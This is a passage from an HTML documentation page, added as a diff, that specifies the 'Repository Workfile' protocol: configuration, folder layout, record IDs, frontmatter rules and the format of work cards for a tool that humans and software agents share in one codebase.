@@ -1,0 +1,2431 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="color-scheme" content="light dark">
+<title>Spec — Repository Workfile — Workfile docs</title>
+<meta name="description" content="Projects accumulate operational knowledge in several incompatible places:">
+<link rel="canonical" href="https://workfile.illodev.com/docs/spec">
+<link rel="alternate" type="text/markdown" href="/docs/spec.md" title="This page as Markdown">
+<meta property="og:type" content="article">
+<meta property="og:site_name" content="Workfile">
+<meta property="og:title" content="Spec — Repository Workfile — Workfile docs">
+<meta property="og:description" content="Projects accumulate operational knowledge in several incompatible places:">
+<meta property="og:url" content="https://workfile.illodev.com/docs/spec">
+<meta property="og:image" content="https://workfile.illodev.com/assets/social.png">
+<meta name="twitter:card" content="summary_large_image">
+<link rel="icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 96 96%22 fill=%22none%22><rect x=%2210%22 y=%2210%22 width=%2276%22 height=%2276%22 rx=%2222%22 stroke=%22%233149D4%22 stroke-width=%228%22/><line x1=%2230%22 y1=%2236%22 x2=%2266%22 y2=%2236%22 stroke=%22%233149D4%22 stroke-width=%228%22 stroke-linecap=%22round%22/><line x1=%2242%22 y1=%2248%22 x2=%2266%22 y2=%2248%22 stroke=%22%233149D4%22 stroke-width=%228%22 stroke-linecap=%22round%22/><line x1=%2230%22 y1=%2260%22 x2=%2266%22 y2=%2260%22 stroke=%22%233149D4%22 stroke-width=%228%22 stroke-linecap=%22round%22/></svg>">
+<link rel="preload" href="/assets/geist-mono-latin-wght-normal.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="stylesheet" href="/assets/site.css">
+<script type="application/ld+json">{"@context":"https://schema.org","@graph":[{"@type":"TechArticle","headline":"Spec — Repository Workfile","description":"Projects accumulate operational knowledge in several incompatible places:","url":"https://workfile.illodev.com/docs/spec","inLanguage":"en","about":{"@id":"https://workfile.illodev.com/#software"},"isPartOf":{"@type":"WebSite","name":"Workfile","url":"https://workfile.illodev.com/"}},{"@type":"SoftwareApplication","@id":"https://workfile.illodev.com/#software","name":"Workfile","url":"https://workfile.illodev.com/"},{"@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Workfile","item":"https://workfile.illodev.com/"},{"@type":"ListItem","position":2,"name":"Docs","item":"https://workfile.illodev.com/docs/getting-started"},{"@type":"ListItem","position":3,"name":"Spec — Repository Workfile","item":"https://workfile.illodev.com/docs/spec"}]}]}</script>
+</head>
+<body>
+<a class="skip" href="#main">Skip to content</a>
+<header class="bar"><div class="bar-in">
+<a class="brand" href="/"><svg viewBox="0 0 96 96" fill="none" aria-hidden="true"><rect x="10" y="10" width="76" height="76" rx="22" stroke="currentColor" stroke-width="8"/><line x1="30" y1="36" x2="66" y2="36" stroke="currentColor" stroke-width="8" stroke-linecap="round"/><line x1="42" y1="48" x2="66" y2="48" stroke="currentColor" stroke-width="8" stroke-linecap="round"/><line x1="30" y1="60" x2="66" y2="60" stroke="currentColor" stroke-width="8" stroke-linecap="round"/></svg><span>workfile</span></a>
+<nav class="bar-nav" aria-label="Site"><a href="/docs/getting-started" aria-current="page">docs</a><a href="/vs/backlog-md">compare</a><a href="https://github.com/illodev/workfile">github</a><a href="https://www.npmjs.com/package/@illodev/workfile">npm</a></nav>
+</div></header>
+<div class="page-grid">
+<nav class="side" aria-label="Pages"><p class="side-label">&lt;docs&gt;</p><ol><li><a href="/docs/getting-started">Getting started</a></li><li><a href="/docs/cli">CLI reference</a></li><li><a href="/docs/mcp">MCP server</a></li><li><a href="/docs/http-api">HTTP API</a></li><li><a href="/docs/ui">The interface</a></li><li><a href="/docs/security">Security model</a></li><li><a href="/docs/spec" aria-current="page">Spec — Repository Workfile</a><ol><li><a href="#1-purpose">1. Purpose</a></li><li><a href="#2-goals">2. Goals</a></li><li><a href="#3-non-goals">3. Non-goals</a></li><li><a href="#4-design-principles">4. Design principles</a></li><li><a href="#5-terminology">5. Terminology</a></li><li><a href="#6-distribution-architecture">6. Distribution architecture</a></li><li><a href="#7-workspace-discovery">7. Workspace discovery</a></li><li><a href="#8-configuration">8. Configuration</a></li><li><a href="#9-canonical-folder-layout">9. Canonical folder layout</a></li><li><a href="#10-common-record-contract">10. Common record contract</a></li><li><a href="#11-module-work-cards">11. Module: Work cards</a></li><li><a href="#12-module-documentation">12. Module: Documentation</a></li><li><a href="#13-module-changelog-and-releases">13. Module: Changelog and releases</a></li><li><a href="#14-module-project-memory">14. Module: Project memory</a></li><li><a href="#15-sources-and-traceability">15. Sources and traceability</a></li><li><a href="#16-core-architecture">16. Core architecture</a></li><li><a href="#17-derived-index-and-search">17. Derived index and search</a></li><li><a href="#18-validation-and-workfile-doctor">18. Validation and workfile doctor</a></li><li><a href="#19-cli">19. CLI</a></li><li><a href="#20-local-server-and-http-api">20. Local server and HTTP API</a></li><li><a href="#21-user-interface">21. User interface</a></li><li><a href="#22-agent-protocol">22. Agent protocol</a></li><li><a href="#23-mcp-and-tool-adapters">23. MCP and tool adapters</a></li><li><a href="#24-security-and-safety">24. Security and safety</a></li><li><a href="#25-schema-versioning-and-migrations">25. Schema versioning and migrations</a></li><li><a href="#26-migration-from-unified-backlog-system-v1">26. Migration from Unified Backlog System v1</a></li><li><a href="#27-extensibility">27. Extensibility</a></li><li><a href="#28-performance-requirements">28. Performance requirements</a></li><li><a href="#29-testing-strategy">29. Testing strategy</a></li><li><a href="#30-ci-integration">30. CI integration</a></li><li><a href="#31-observability">31. Observability</a></li><li><a href="#32-mvp-definition">32. MVP definition</a></li><li><a href="#33-implementation-phases">33. Implementation phases</a></li><li><a href="#34-phase-0-decisions">34. Phase 0 decisions</a></li><li><a href="#35-locked-implementation-defaults">35. Locked implementation defaults</a></li><li><a href="#36-phase-6-integration-decisions">36. Phase 6 integration decisions</a></li><li><a href="#37-amendment-log">37. Amendment log</a></li></ol></li></ol><p class="side-label">&lt;compare&gt;</p><ol><li><a href="/vs/backlog-md">vs Backlog.md</a></li><li><a href="/vs/beads">vs Beads</a></li><li><a href="/vs/task-master">vs Task Master</a></li></ol></nav>
+<main id="main" class="page-main">
+<p class="twin"><span>GET /docs/spec</span><span>Accept: text/markdown</span><span>→ <a href="/docs/spec.md">/docs/spec.md</a></span><span>≈22,600 tokens</span></p>
+<article class="prose">
+<h1 id="spec--repository-workfile">Spec — Repository Workfile</h1>
+<blockquote>
+<p><strong>Status: v2.0 RC2 — MCP INTEGRATION CONTRACT — 2026-07-28</strong></p>
+<p>Product name: <strong>Workfile</strong><br>Package name: <code>@illodev/workfile</code><br>CLI name: <code>workfile</code> (alias <code>wf</code>; the MCP server is <code>workfile-mcp</code>)<br>Default storage root: <code>.project/</code></p>
+<p>This document defines a portable, repository-native operating protocol for project work,
+documentation, change history and durable workfile memory. It is intended for humans and
+software agents working in the same codebase.</p>
+<p>The names above are placeholders. Renaming the product or package must not change the data
+model or the protocol.</p>
+</blockquote>
+<h2 id="1-purpose"><a class="hash" href="#1-purpose" aria-hidden="true" tabindex="-1">##</a> 1. Purpose</h2>
+<p>Projects accumulate operational knowledge in several incompatible places:</p>
+<ul>
+<li>pending work in issue trackers, planning documents, comments and agent summaries;</li>
+<li>documentation spread across READMEs, architecture notes and product specifications;</li>
+<li>changes recorded inconsistently in commits, release notes and changelog files;</li>
+<li>decisions, incidents and lessons retained only in conversations or individual memory.</li>
+</ul>
+<p>This fragmentation causes two recurring failures:</p>
+<ol>
+<li>Humans cannot obtain a reliable view of what the project knows, what it plans to do and
+why previous decisions were made.</li>
+<li>Agents repeatedly rediscover context, produce duplicate work, overwrite each other or
+finish a session without persisting newly discovered knowledge.</li>
+</ol>
+<p>The Repository Workfile solves this by defining a versioned, local-first standard
+whose canonical records live inside the repository as reviewable text files.</p>
+<p>The protocol covers four first-class domains:</p>
+<ol>
+<li><strong>Work</strong> — cards representing ideas, tasks, bugs, features and execution hierarchy.</li>
+<li><strong>Docs</strong> — discoverable project documentation, whether managed or merely indexed.</li>
+<li><strong>History</strong> — structured change fragments and generated release changelogs.</li>
+<li><strong>Memory</strong> — durable decisions, learnings, incidents, conventions and temporary context.</li>
+</ol>
+<p>A local UI, CLI and agent integrations operate over the same data model. None of them owns
+exclusive state.</p>
+<h2 id="2-goals"><a class="hash" href="#2-goals" aria-hidden="true" tabindex="-1">##</a> 2. Goals</h2>
+<p>The standard MUST:</p>
+<ul>
+<li>keep the repository as the source of truth;</li>
+<li>remain useful without a hosted service;</li>
+<li>work in single repositories and monorepos;</li>
+<li>be readable and editable without the official UI;</li>
+<li>provide deterministic parsing and serialization for agents;</li>
+<li>support thousands of records without hiding work in long documents;</li>
+<li>expose one shared model to CLI, UI, CI and agent tools;</li>
+<li>support configuration without making every project semantically incompatible;</li>
+<li>preserve history through Git instead of replacing it;</li>
+<li>detect invalid, contradictory or stale project state;</li>
+<li>permit gradual adoption by existing projects;</li>
+<li>version the data contract and provide migrations;</li>
+<li>avoid coupling the protocol to a particular AI vendor, IDE or issue tracker.</li>
+</ul>
+<h2 id="3-non-goals"><a class="hash" href="#3-non-goals" aria-hidden="true" tabindex="-1">##</a> 3. Non-goals</h2>
+<p>Version 2 does not aim to be:</p>
+<ul>
+<li>a general-purpose team chat system;</li>
+<li>a replacement for Git;</li>
+<li>a hosted multi-tenant project-management SaaS;</li>
+<li>a real-time distributed lock manager;</li>
+<li>a full sprint, payroll or time-tracking product;</li>
+<li>an automatic truth engine that rewrites documentation based on source code;</li>
+<li>a vector database committed to the repository;</li>
+<li>an unrestricted plugin marketplace;</li>
+<li>a replacement for external issue trackers where an organization requires one.</li>
+</ul>
+<p>External systems MAY be integrated through adapters, but the core standard remains usable
+without them.</p>
+<h2 id="4-design-principles"><a class="hash" href="#4-design-principles" aria-hidden="true" tabindex="-1">##</a> 4. Design principles</h2>
+<h3 id="41-repository-native"><a class="hash" href="#41-repository-native" aria-hidden="true" tabindex="-1">###</a> 4.1 Repository-native</h3>
+<p>Canonical records are ordinary files committed to Git. A clone of the repository contains
+all durable protocol data needed to understand the project.</p>
+<h3 id="42-text-is-canonical-indexes-are-disposable"><a class="hash" href="#42-text-is-canonical-indexes-are-disposable" aria-hidden="true" tabindex="-1">###</a> 4.2 Text is canonical; indexes are disposable</h3>
+<p>Markdown and configuration files are authoritative. SQLite, search indexes, embeddings and
+other caches are derived state and MUST be rebuildable.</p>
+<h3 id="43-one-fact-one-owner"><a class="hash" href="#43-one-fact-one-owner" aria-hidden="true" tabindex="-1">###</a> 4.3 One fact, one owner</h3>
+<p>The same fact SHOULD NOT be duplicated across paths, filenames, frontmatter and generated
+indexes. References are preferred over copied state.</p>
+<p>Examples:</p>
+<ul>
+<li>hierarchy uses <code>parent:</code> rather than nested task folders;</li>
+<li>attachments are discovered by record ID rather than duplicated in frontmatter;</li>
+<li>generated changelogs consume fragments rather than becoming a second editable source;</li>
+<li>collection labels come from configuration rather than being copied into each document.</li>
+</ul>
+<h3 id="44-deterministic-agent-writes"><a class="hash" href="#44-deterministic-agent-writes" aria-hidden="true" tabindex="-1">###</a> 4.4 Deterministic agent writes</h3>
+<p>An agent must be able to create or mutate a record without guessing formatting conventions.
+The official core MUST provide stable parsing, serialization, ID allocation and validation.</p>
+<h3 id="45-human-editable-escape-hatch"><a class="hash" href="#45-human-editable-escape-hatch" aria-hidden="true" tabindex="-1">###</a> 4.5 Human-editable escape hatch</h3>
+<p>The CLI and UI are preferred mutation paths, but direct file editing remains supported.
+<code>workfile doctor</code> is the reconciliation mechanism after manual edits.</p>
+<h3 id="46-progressive-enhancement"><a class="hash" href="#46-progressive-enhancement" aria-hidden="true" tabindex="-1">###</a> 4.6 Progressive enhancement</h3>
+<p>A project MAY adopt only cards first, then documentation, history and memory later. Missing
+modules MUST NOT make the installed modules unusable.</p>
+<h3 id="47-portable-semantics-configurable-vocabulary"><a class="hash" href="#47-portable-semantics-configurable-vocabulary" aria-hidden="true" tabindex="-1">###</a> 4.7 Portable semantics, configurable vocabulary</h3>
+<p>Core behavior is standardized. Projects may configure bounded vocabularies such as areas,
+labels and memory collections, but MUST NOT redefine fundamental semantics such as the
+meaning of a closed card or the identity of a record.</p>
+<h3 id="48-local-by-default"><a class="hash" href="#48-local-by-default" aria-hidden="true" tabindex="-1">###</a> 4.8 Local by default</h3>
+<p>The server binds to loopback by default, performs no telemetry by default and sends no
+repository data to an external service unless the user explicitly configures an adapter.</p>
+<h2 id="5-terminology"><a class="hash" href="#5-terminology" aria-hidden="true" tabindex="-1">##</a> 5. Terminology</h2>
+<div class="table"><table>
+<thead>
+<tr>
+<th>Term</th>
+<th>Meaning</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>Workspace</strong></td>
+<td>A repository root governed by one <code>project.config.mjs</code>.</td>
+</tr>
+<tr>
+<td><strong>Protocol root</strong></td>
+<td>Directory containing managed protocol records, <code>.project/</code> by default.</td>
+</tr>
+<tr>
+<td><strong>Module</strong></td>
+<td>A first-class domain: cards, docs, changelog, memory or health.</td>
+</tr>
+<tr>
+<td><strong>Record</strong></td>
+<td>A stable identifiable unit represented by a file.</td>
+</tr>
+<tr>
+<td><strong>Collection</strong></td>
+<td>A configured group of records sharing a parser and semantics.</td>
+</tr>
+<tr>
+<td><strong>Managed document</strong></td>
+<td>A document created and mutated by the protocol.</td>
+</tr>
+<tr>
+<td><strong>Indexed document</strong></td>
+<td>An existing repository document discovered by the protocol but not owned by it.</td>
+</tr>
+<tr>
+<td><strong>Source</strong></td>
+<td>A long-form or external-origin document from which operational records were derived.</td>
+</tr>
+<tr>
+<td><strong>Derived index</strong></td>
+<td>Rebuildable search and relationship data stored outside canonical files.</td>
+</tr>
+<tr>
+<td><strong>Agent adapter</strong></td>
+<td>Generated instructions or tooling for a particular assistant or IDE.</td>
+</tr>
+<tr>
+<td><strong>Schema version</strong></td>
+<td>Version of the canonical on-disk protocol contract.</td>
+</tr>
+</tbody></table></div>
+<h2 id="6-distribution-architecture"><a class="hash" href="#6-distribution-architecture" aria-hidden="true" tabindex="-1">##</a> 6. Distribution architecture</h2>
+<h3 id="61-initial-packaging-decision"><a class="hash" href="#61-initial-packaging-decision" aria-hidden="true" tabindex="-1">###</a> 6.1 Initial packaging decision</h3>
+<p>The repository is a pnpm workspace with a private root; the published surface
+is one core npm package plus optional provider packages (for example
+<code>@illodev/workfile-search-local</code>) released in version lockstep with it.
+Repository layout and npm packaging are independent decisions — the core
+SHOULD keep shipping as one npm package with strong internal module
+boundaries:</p>
+<pre class="code" data-lang="text"><code>@illodev/workfile
+├── bin/                 # project executable
+├── core/                # public programmatic API
+├── modules/
+│   ├── cards/
+│   ├── docs/
+│   ├── changelog/
+│   ├── memory/
+│   └── health/
+├── server/              # local HTTP API
+├── ui/                  # precompiled static application
+├── agents/              # instruction generators
+└── migrations/          # schema and legacy migrations</code></pre>
+<p>Reasons for a single core package:</p>
+<ul>
+<li>installation and version alignment remain simple;</li>
+<li>the existing implementation is already one vertical application;</li>
+<li>UI, server and core can evolve atomically while contracts stabilize;</li>
+<li>splitting the core would create release and compatibility overhead before
+independent consumers exist. Provider packages are the exception, not a
+split: they carry heavy optional dependencies (an inference runtime) that
+must never reach consumers who did not opt in.</li>
+</ul>
+<p>The source code MUST still enforce boundaries that allow later extraction.</p>
+<h3 id="62-future-package-split"><a class="hash" href="#62-future-package-split" aria-hidden="true" tabindex="-1">###</a> 6.2 Future package split</h3>
+<p>The following split MAY occur after at least two independent consumers require it:</p>
+<pre class="code" data-lang="text"><code>@illodev/workfile-core
+@illodev/workfile-cli
+@illodev/workfile-ui
+@illodev/workfile-mcp
+@illodev/workfile</code></pre>
+<p>The metapackage would preserve the same <code>workfile</code> command and configuration contract.</p>
+<h3 id="63-runtime-requirements"><a class="hash" href="#63-runtime-requirements" aria-hidden="true" tabindex="-1">###</a> 6.3 Runtime requirements</h3>
+<ul>
+<li>Node.js: current active LTS and later.</li>
+<li>Package managers: npm, pnpm, Yarn and Bun projects are supported.</li>
+<li>The distributed UI MUST be precompiled; consuming projects do not require Vite or React.</li>
+<li>The package MUST not modify application dependencies unless explicitly requested.</li>
+<li>The CLI MUST work through <code>npx</code>, <code>pnpm dlx</code>, <code>yarn dlx</code> and <code>bunx</code> where supported.</li>
+</ul>
+<h2 id="7-workspace-discovery"><a class="hash" href="#7-workspace-discovery" aria-hidden="true" tabindex="-1">##</a> 7. Workspace discovery</h2>
+<p>The CLI discovers a workspace using this order:</p>
+<ol>
+<li>Explicit <code>--root &lt;path&gt;</code>.</li>
+<li>Nearest ancestor containing <code>project.config.mjs</code>.</li>
+<li>Nearest ancestor containing <code>.project/VERSION</code>.</li>
+<li>Current Git worktree root.</li>
+<li>Current working directory.</li>
+</ol>
+<p>Every command MUST print the resolved workspace root when <code>--verbose</code> is given.
+It goes to stderr, so a <code>--json</code> consumer is unaffected and the answer still
+reaches a human watching the run. <code>workfile ui</code> also prints it unconditionally
+as part of its startup banner, and <code>--verbose</code> additionally turns on request
+logging there.</p>
+<p>A workspace is loaded through one function:</p>
+<pre class="code" data-lang="ts"><code>interface LoadWorkspaceOptions {
+    cwd?: string;
+    configPath?: string;
+    readOnly?: boolean;
+}
+
+async function loadWorkspace(
+    options?: LoadWorkspaceOptions
+): Promise&lt;ProjectWorkspace&gt;;</code></pre>
+<p>Every CLI command, HTTP route, UI request and future MCP tool MUST use the same workspace
+loader. No module may infer repository-relative paths from its own installed package path.</p>
+<h2 id="8-configuration"><a class="hash" href="#8-configuration" aria-hidden="true" tabindex="-1">##</a> 8. Configuration</h2>
+<h3 id="81-canonical-file"><a class="hash" href="#81-canonical-file" aria-hidden="true" tabindex="-1">###</a> 8.1 Canonical file</h3>
+<p>The canonical configuration file is <code>project.config.mjs</code> at the workspace root.</p>
+<pre class="code" data-lang="js"><code>import { defineProject } from &quot;@illodev/workfile&quot;;
+
+export default defineProject({
+    schemaVersion: 2,
+    name: &quot;Example project&quot;,
+
+    storage: {
+        root: &quot;.project&quot;,
+        cache: &quot;.project/.cache&quot;
+    },
+
+    cards: {
+        enabled: true,
+        path: &quot;.project/cards&quot;,
+        archivePath: &quot;.project/cards/archive&quot;,
+        assetsPath: &quot;.project/assets&quot;,
+        idPrefix: &quot;T&quot;,
+        maxHierarchyDepth: 2,
+        claimLeaseHours: 24,
+        areas: [&quot;api&quot;, &quot;web&quot;, &quot;infra&quot;, &quot;docs&quot;],
+        axes: { context: [&quot;treasury&quot;, &quot;verifactu&quot;, &quot;billing&quot;, &quot;iam&quot;] },
+        tags: []
+    },
+
+    docs: {
+        enabled: true,
+        managedPath: &quot;.project/docs&quot;,
+        layout: &quot;kind&quot;,
+        sources: [
+            &quot;README.md&quot;,
+            &quot;docs/**/*.md&quot;,
+            &quot;apps/*/README.md&quot;,
+            &quot;.project/specs/**/*.md&quot;
+        ],
+        exclude: [&quot;**/node_modules/**&quot;, &quot;**/vendor/**&quot;]
+    },
+
+    changelog: {
+        enabled: true,
+        fragmentsPath: &quot;.project/changelog/unreleased&quot;,
+        releasesPath: &quot;.project/changelog/releases&quot;,
+        output: &quot;CHANGELOG.md&quot;
+    },
+
+    memory: {
+        enabled: true,
+        path: &quot;.project/memory&quot;,
+        collections: [
+            &quot;learnings&quot;,
+            &quot;decisions&quot;,
+            &quot;incidents&quot;,
+            &quot;conventions&quot;,
+            &quot;context&quot;
+        ]
+    },
+
+    agents: {
+        canonicalInstructions: &quot;.project/agents/protocol.md&quot;,
+        targets: [&quot;agents-md&quot;, &quot;claude&quot;, &quot;cursor&quot;, &quot;copilot&quot;]
+    },
+
+    ui: {
+        host: &quot;127.0.0.1&quot;,
+        port: 4747,
+        open: true
+    }
+});</code></pre>
+<h3 id="82-configuration-rules"><a class="hash" href="#82-configuration-rules" aria-hidden="true" tabindex="-1">###</a> 8.2 Configuration rules</h3>
+<ul>
+<li><code>schemaVersion</code> is required.</li>
+<li>All paths are repository-relative and MUST resolve inside the workspace unless a specific
+read-only external source adapter permits otherwise.</li>
+<li>The config module MUST be loaded without transpilation.</li>
+<li>Unknown top-level keys produce a warning in development and an error in strict CI mode.</li>
+<li>Environment variables MAY override runtime settings such as host and port, but MUST NOT
+silently alter canonical storage paths.</li>
+<li>Functions in configuration are permitted only through documented extension points.</li>
+<li>Secrets MUST NOT be stored in <code>project.config.mjs</code>; adapters use environment variables or
+external secret stores.</li>
+</ul>
+<h3 id="83-stable-and-configurable-vocabularies"><a class="hash" href="#83-stable-and-configurable-vocabularies" aria-hidden="true" tabindex="-1">###</a> 8.3 Stable and configurable vocabularies</h3>
+<p>The following are protocol-defined and stable in schema version 2:</p>
+<ul>
+<li>card statuses;</li>
+<li>base card types;</li>
+<li>priority semantics;</li>
+<li>relationship fields;</li>
+<li>core memory kinds;</li>
+<li>changelog fragment types;</li>
+<li>record identity and date formats.</li>
+</ul>
+<p>The following are project-configurable:</p>
+<ul>
+<li>areas;</li>
+<li>additional classification axes (<code>cards.axes</code>);</li>
+<li>the commands a card may name and the verification methods each area accepts
+at <code>done</code> (<code>cards.verification</code>);</li>
+<li>optional custom tags;</li>
+<li>source globs;</li>
+<li>enabled memory collections;</li>
+<li>UI preferences;</li>
+<li>agent adapter targets;</li>
+<li>additional validation rules.</li>
+</ul>
+<p>Projects MAY add custom card types or memory collections through namespaced extensions, but
+portable tools are required to treat unknown namespaced values as generic records rather
+than failing to load the workspace.</p>
+<h2 id="9-canonical-folder-layout"><a class="hash" href="#9-canonical-folder-layout" aria-hidden="true" tabindex="-1">##</a> 9. Canonical folder layout</h2>
+<pre class="code" data-lang="text"><code>project.config.mjs
+.project/
+├── VERSION
+├── cards/
+│   ├── T-0001-example.md
+│   └── archive/
+├── assets/
+│   └── T-0001/
+├── docs/                       # optional managed documents
+├── changelog/
+│   ├── unreleased/
+│   └── releases/
+├── memory/
+│   ├── learnings/
+│   ├── decisions/
+│   ├── incidents/
+│   ├── conventions/
+│   └── context/
+├── specs/
+├── sources/                    # optional raw inputs, created on first use
+├── agents/
+│   ├── protocol.md
+│   └── workflows/
+└── .cache/                     # gitignored, fully rebuildable</code></pre>
+<p>Rules:</p>
+<ul>
+<li><code>.project/VERSION</code> contains the schema version and MAY contain migration metadata.</li>
+<li>Canonical record folders are committed to Git.</li>
+<li><code>.project/.cache/</code> MUST be ignored by Git.</li>
+<li>Empty optional directories need not exist until first use.</li>
+<li>Existing project documentation may remain outside <code>.project/</code> and be indexed through
+configuration.</li>
+<li>Record files SHOULD remain flat within their collection unless that collection explicitly
+defines date- or release-based partitioning.</li>
+</ul>
+<h2 id="10-common-record-contract"><a class="hash" href="#10-common-record-contract" aria-hidden="true" tabindex="-1">##</a> 10. Common record contract</h2>
+<p>All managed records share a small conceptual contract:</p>
+<pre class="code" data-lang="ts"><code>interface ProjectRecord {
+    id: string;
+    kind: string;
+    title: string;
+    path: string;
+    created?: string;
+    updated?: string;
+    tags?: string[];
+    related?: string[];
+    body: string;
+}</code></pre>
+<p>Not every file must physically repeat <code>kind</code> when its collection supplies it. The normalized
+runtime model includes it.</p>
+<h3 id="101-ids"><a class="hash" href="#101-ids" aria-hidden="true" tabindex="-1">###</a> 10.1 IDs</h3>
+<ul>
+<li>IDs are stable and MUST never be reused.</li>
+<li>An ID is <code>&lt;PREFIX&gt;-&lt;SEQUENCE&gt;</code> unless a module defines a date-keyed release ID.</li>
+<li>Default prefixes:</li>
+</ul>
+<div class="table"><table>
+<thead>
+<tr>
+<th>Record</th>
+<th>Prefix</th>
+<th>Example</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Card</td>
+<td><code>T</code></td>
+<td><code>T-0042</code></td>
+</tr>
+<tr>
+<td>Managed doc</td>
+<td><code>DOC</code></td>
+<td><code>DOC-0012</code></td>
+</tr>
+<tr>
+<td>Changelog fragment</td>
+<td><code>CHG</code></td>
+<td><code>CHG-0091</code></td>
+</tr>
+<tr>
+<td>Learning</td>
+<td><code>LRN</code></td>
+<td><code>LRN-0017</code></td>
+</tr>
+<tr>
+<td>Decision</td>
+<td><code>ADR</code></td>
+<td><code>ADR-0008</code></td>
+</tr>
+<tr>
+<td>Incident</td>
+<td><code>INC</code></td>
+<td><code>INC-0004</code></td>
+</tr>
+<tr>
+<td>Convention</td>
+<td><code>CONV</code></td>
+<td><code>CONV-0006</code></td>
+</tr>
+<tr>
+<td>Context</td>
+<td><code>CTX</code></td>
+<td><code>CTX-0011</code></td>
+</tr>
+</tbody></table></div>
+<ul>
+<li>Sequence width is at least four digits and expands without changing existing IDs.</li>
+<li>Allocation MUST scan active and archived records or use a transaction-safe local allocator.</li>
+<li>Concurrent CLI writers MUST not receive the same ID.</li>
+</ul>
+<h3 id="102-dates"><a class="hash" href="#102-dates" aria-hidden="true" tabindex="-1">###</a> 10.2 Dates</h3>
+<ul>
+<li>Calendar dates use <code>YYYY-MM-DD</code>.</li>
+<li>Exact timestamps use RFC 3339 UTC unless a field explicitly requires a calendar date.</li>
+<li><code>created</code> is immutable after creation.</li>
+<li><code>updated</code> changes when canonical content or metadata changes.</li>
+<li>Generated indexes MUST preserve the source file modification time separately from semantic
+<code>updated</code>.</li>
+</ul>
+<h3 id="103-references"><a class="hash" href="#103-references" aria-hidden="true" tabindex="-1">###</a> 10.3 References</h3>
+<p>Cross-module references use record IDs where possible:</p>
+<pre class="code" data-lang="yaml"><code>related: [T-0042, ADR-0008, CHG-0091]</code></pre>
+<p>Paths remain valid where the target is not a managed record:</p>
+<pre class="code" data-lang="yaml"><code>source: docs/research/payment-retries.md</code></pre>
+<p>The indexer resolves references into a graph. Unknown IDs produce doctor warnings or errors
+according to the field&#39;s strictness.</p>
+<h3 id="104-frontmatter-format"><a class="hash" href="#104-frontmatter-format" aria-hidden="true" tabindex="-1">###</a> 10.4 Frontmatter format</h3>
+<p>The protocol uses a deliberately restricted YAML-compatible subset:</p>
+<ul>
+<li>one scalar per line;</li>
+<li>inline scalar lists using <code>[a, b]</code>;</li>
+<li>JSON-compatible double-quoted escaping;</li>
+<li>simple single-quoted scalars may be read for compatibility;</li>
+<li>block scalars (<code>|</code>, <code>&gt;</code>) and block sequences may be read, and are written back in the
+style they were read in;</li>
+<li>a scalar list written as a flow sequence spread over several lines — which is what a
+formatter produces from <code>[a, b]</code> when the line exceeds its print width — MUST be read as
+the list it is, for any key declared a list;</li>
+<li>nesting goes exactly one level deep, in one of two shapes — a mapping of scalars and
+inline lists, or a sequence of such mappings;</li>
+<li>no anchors, aliases or tags, and no nesting past that one level;</li>
+<li>deeper structures use dedicated JSON files or repeated Markdown sections.</li>
+</ul>
+<p>A key whose value falls outside this subset MUST be preserved verbatim on read and MUST be
+refused on write, with an error naming the key. Writing a value the format cannot represent
+MUST be refused for the same reason: silently serializing it loses what the author wrote.</p>
+<p>The parser and serializer MUST be exact inverses for supported values. Repeated saves MUST
+not cause textual drift. A nested value&#39;s list-ness is determined by how it is written —
+<code>[a, b]</code> — and not by the name of its key, since key-level list declarations apply only to
+the top level.</p>
+<p>A multi-line flow sequence is the single exception to style preservation, and MUST be
+written back on one line. Reproducing the way it was read would mean re-deriving a
+formatter&#39;s line breaks from a print width the codec does not know, and it is only ever
+rewritten as part of a write to that key. Drift is bounded rather than absent: the shape
+converges on the canonical one in a single save and is stable from there.</p>
+<h2 id="11-module-work-cards"><a class="hash" href="#11-module-work-cards" aria-hidden="true" tabindex="-1">##</a> 11. Module: Work cards</h2>
+<h3 id="111-purpose"><a class="hash" href="#111-purpose" aria-hidden="true" tabindex="-1">###</a> 11.1 Purpose</h3>
+<p>Cards represent actionable or potentially actionable project work. They are the operational
+layer of the protocol and SHOULD remain concise enough to scan, prioritize and execute.</p>
+<h3 id="112-file-format"><a class="hash" href="#112-file-format" aria-hidden="true" tabindex="-1">###</a> 11.2 File format</h3>
+<p>Filename:</p>
+<pre class="code" data-lang="text"><code>T-NNNN-short-slug.md</code></pre>
+<p>Example:</p>
+<pre class="code" data-lang="yaml"><code>---
+id: T-0042
+title: Prevent duplicate invoice submission
+status: doing
+type: bug
+priority: high
+area: billing
+parent: T-0010
+depends: [T-0038]
+origin: [T-0031, ADR-0004]
+source: .project/sources/audits/invoicing.md
+tags: [invoices, idempotency]
+effort: M
+start: 2026-07-28
+due: 2026-08-01
+scope: [apps/api/src/Billing, packages/sdk]
+claimed_by: session-56a30d1b
+claimed_at: 2026-07-28T09:32:00Z
+created: 2026-07-26
+updated: 2026-07-28
+---
+
+The submission endpoint can create duplicate records after a network retry.
+
+## Acceptance criteria
+
+- [ ] Repeated requests with the same idempotency key create one invoice.
+- [ ] Existing non-idempotent clients remain compatible.
+
+## Activity
+
+- 2026-07-28 09:32Z alice@studio · claimed
+- 2026-07-28 11:04Z alice@studio via:claude-opus-4-1/high · backlog → doing
+
+## Notes
+
+- 2026-07-28 — Claimed after confirming no overlapping active scope.</code></pre>
+<p><code>## Activity</code> is the durable trail: every claim, release, transition, archive
+and renumber appends one line, written by the mutation itself rather than by
+the caller. A command that moved nothing appends nothing, so <code>transition ID review</code> against a card already in <code>review</code> leaves no entry, and archiving an
+archived card leaves none either. Archiving and unarchiving are written as
+<code>archived</code> and <code>unarchived</code> rather than as a status change, because neither
+moves the status. <code>## Notes</code> is the opposite — free prose a human or agent
+writes deliberately.</p>
+<p>A move that <code>force</code> let past a gate MUST say which gate and why, on the same
+line — <code>review → done (forced past 3 unproven criteria: REASON)</code> — and the
+reason MUST be demanded when, and only when, <code>force</code> waived something. Without
+it a forced close and a proven one are the same entry, and every count taken
+over closed cards counts them alike.</p>
+<p>Set <code>cards.activityTrail: false</code> to switch the trail off for a workspace. It
+defaults to <code>true</code>, and the only reason to disable it is a repository where the
+churn costs more than the history is worth; the claim guards and the doctor do
+not read it.</p>
